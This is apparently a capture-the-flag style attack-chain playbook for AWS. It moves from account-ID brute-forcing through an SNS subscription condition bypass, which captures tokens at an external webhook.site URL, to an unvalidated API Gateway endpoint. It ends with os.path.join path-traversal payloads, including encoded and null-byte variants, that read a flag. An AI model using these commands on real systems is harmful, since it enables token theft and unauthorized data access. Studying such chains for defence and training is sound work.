# Chain: s3recon Account ID Enum → SNS StringLike Bypass → APIGW Bypass → os.path.join Traversal → S3 Flag
Tags: aws, s3, s3recon, sns, apigw, lambda, os-path-join, path-traversal, account-id-enum, multiservice, stringlike-bypass, token-capture
Chain Severity: High
Entry Condition: AWS bucket name known but account ID unknown/wrong; assumable IAM role available; SNS topic ARN reachable; two API Gateway endpoints present (APIGW-1 with schema validation, APIGW-2 unvalidated)

## Node 1 — s3recon Account ID Brute-Force
Technique: [[Cloud/S3_Secrets#AWS Account ID Enumeration via s3recon]]
Strike Vector: "s3recon account ID brute-force via s3:ResourceAccount condition key"
Condition: Assumable IAM role with `s3:GetObject`; target bucket name known; `s3recon` installed
Standalone Severity: Low
Branches:
  - `python3 -m s3recon.cli --role <role> --bucket <bucket>/index.html` returns 12-digit account ID → Node 2
  - Role lacks `s3:GetObject` → check for `s3:ListBucket` fallback; if neither → [TERMINAL] Insufficient S3 perms — try public bucket or credential leak path
  - `s3recon` not available → manual binary brute-force using session policy with `s3:ResourceAccount` StringLike condition digit-by-digit (120 requests for 12 digits)

## Node 2 — SNS StringLike Endpoint Condition Bypass
Technique: [[Cloud/SNS#SNS Topic StringLike Endpoint Condition Bypass via Query Parameter]]
Strike Vector: "SNS subscribe with query param to satisfy StringLike *@domain.com"
Condition: SNS topic ARN known; AWS credentials available (base user, not assumed role if role identity policy blocks `sns:Subscribe`); HTTPS webhook reachable from SNS (webhook.site)
Standalone Severity: Med
Branches:
  - `aws sns subscribe --protocol https --notification-endpoint "https://webhook.site/<uuid>?x=@domain.com"` → SubscriptionArn "pending confirmation" → Node 3
  - Assumed role identity policy blocks `sns:Subscribe` → `unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN` to use base user creds → retry
  - SNS topic policy requires `aws:SourceVpc` condition → [TERMINAL] VPC-locked subscription; need internal Lambda/EC2 to relay

## Node 3 — Token Capture via Webhook Subscription Confirmation
Technique: [[Cloud/SNS#SNS Topic StringLike Endpoint Condition Bypass via Query Parameter]]
Strike Vector: "SNS SubscriptionConfirmation and Notification token capture"
Condition: webhook.site URL confirmed; SNS sends `SubscriptionConfirmation` POST with `SubscribeURL`; application publishes token/JWT to the topic
Standalone Severity: High
Branches:
  - Fetch `SubscribeURL` to confirm subscription; trigger app action (e.g., request password reset or invite); SNS Notification JSON arrives at webhook with captured token → Node 4
  - Application never publishes to SNS topic → wrong topic ARN or action not triggering publish → enumerate other topic ARNs, check CloudTrail for `sns:Publish` events
  - Token expires before use → automate confirmation + trigger in the same script to minimize latency

## Node 4 — Dual APIGW: Schema Validation Bypass
Technique: [[Cloud/Lambda_Serverless#Python os.path.join() Absolute Path Traversal in Lambda]]
Strike Vector: "unvalidated second APIGW endpoint bypass"
Condition: Two APIGW endpoints discovered; APIGW-1 enforces schema validation (rejects `/flag` as template value); APIGW-2 lacks validator; captured token available for authentication
Standalone Severity: High
Branches:
  - POST to APIGW-2 with captured token and `"template": "/flag"` bypasses schema validation → Node 5
  - APIGW-2 not discovered → enumerate API Gateway stages via AWS console (if creds permit) or probe common path variants (`/v2/`, `/prod2/`, different subdomain)
  - Both endpoints validate → check if `Content-Type: text/plain` bypasses JSON schema validator; try body mutations

## Node 5 — os.path.join() Absolute Path Traversal in Lambda
Technique: [[Cloud/Lambda_Serverless#Python os.path.join() Absolute Path Traversal in Lambda]]
Strike Vector: "os.path.join absolute path override"
Condition: Lambda uses `os.path.join("templates", user_input)`; filter blocks `..` but not absolute paths starting with `/`; target file known (e.g., `/flag.txt`)
Standalone Severity: High
Branches:
  - `"template": "/flag"` → Lambda resolves `os.path.join("templates", "/flag")` → `/flag` → reads and returns file content → Node 6
  - Lambda appends `.txt` or other extension → adjust input to `/flag` or `/flag.txt` as needed
  - Filter blocks leading `/` → try URL encoding `%2Fflag` or null-byte if filter is string-only (`/\x00flag`)
  - Wrong file path → probe `/flag.txt`, `/tmp/flag`, `/var/task/flag`, `/etc/flag` via separate requests

## Node 6 — Private S3 Bucket Flag Read
Technique: [[Cloud/Lambda_Serverless#Python os.path.join() Absolute Path Traversal in Lambda]]
Strike Vector: "Lambda S3 GetObject flag read"
Condition: Lambda reads from private S3 bucket using its execution role; traversal lands on flag object key
Standalone Severity: High
Branches:
  - Lambda returns flag content in HTTP response body → [TERMINAL] Chain Complete (High)
  - Lambda returns S3 signed URL instead of content → follow URL (valid for limited time)
  - AccessDenied from Lambda to S3 → Lambda execution role may lack `s3:GetObject` on flag key; check for alternate path that Lambda reads directly (filesystem vs S3)
